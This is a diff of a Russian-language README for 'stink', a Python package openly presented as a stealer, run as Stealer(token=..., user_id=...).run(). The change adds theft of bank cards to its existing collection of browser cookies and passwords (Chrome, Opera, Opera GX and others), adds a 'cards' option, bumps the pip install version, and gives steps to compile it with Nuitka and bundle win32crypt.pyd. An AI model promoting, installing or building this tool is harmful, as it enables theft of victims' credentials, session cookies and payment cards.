@@ -26,7 +26,7 @@
   * [CMD](#CMD)
 
 ### Текущие возможности
-1. Сбор куки и паролей следующих браузеров:
+1. Сбор куки, паролей и банковских карт следующих браузеров:
    - Chrome
    - Opera
    - Opera GX
@@ -46,7 +46,7 @@
 
 Установить последнюю версию можно командой:
 ```
-pip install stink==0.0.9
+pip install stink==0.0.10
 ```
 
 ## Пример использования
@@ -63,6 +63,8 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 - `passwords` - сбор паролей.
 
 - `cookies` - сбор куки.
+
+- `cards` - сбор банковских карт.
 
 - `processes` - сбор активных процессов.
 
@@ -146,7 +148,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.9
+pip install stink==0.0.10
 ```
 6. В появившейся папке venv переходим по пути `\Lib\site-packages\win32\`.
 7. Копируем файл `win32crypt.pyd`.
